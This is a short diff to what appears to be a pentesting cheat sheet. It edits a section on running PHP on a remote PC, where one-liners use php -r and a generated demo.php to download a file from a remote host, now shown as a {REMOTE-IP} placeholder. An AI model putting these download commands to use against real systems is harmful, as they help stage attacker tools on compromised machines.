@@ -116,10 +116,14 @@ PHP -
     php -S 0.0.0.0:80
 
 **Run PHP script on remote PC**
-    
-    echo "<?php file_put_contents('output.txt', fopen('http://10.10.10.10/demo.txt', 'r')); ?>" > demo.php && php demo.php
 
-    php -r '$file = file_get_contents("https://10.10.10.10/demo.txt"); file_put_contents("demo.txt",$file);'
+Download file.
+
+    php -r '$file = file_get_contents("http://{REMOTE-IP}/demo.txt"); file_put_contents("demo.txt",$file);'
+
+Output save in output.txt file.
+
+    echo "<?php file_put_contents('output.txt', fopen('http://{REMOTE-IP}/demo.txt', 'r')); ?>" > demo.php && php demo.php
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
